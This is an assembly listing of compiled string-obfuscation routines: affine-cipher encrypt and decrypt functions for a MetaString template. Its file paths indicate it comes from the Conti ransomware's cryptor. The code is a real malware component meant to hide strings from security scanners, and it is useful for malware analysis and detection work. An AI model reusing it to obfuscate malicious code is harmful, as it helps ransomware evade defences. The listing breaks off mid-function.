;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 43 00 00 00	 mov	 ecx, 67			; 00000043H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 43
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+67]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1e 00 00 00	 mov	 ecx, 30
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1e	 add	 r8d, 30
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 15	 sub	 eax, 21
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 7c	 sub	 eax, 124		; 0000007cH
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 7c	 add	 r8d, 124		; 0000007cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 2d	 sub	 eax, 45			; 0000002dH
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 2d	 add	 r8d, 45			; 0000002dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 78 00 00 00	 mov	 ecx, 120		; 00000078H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

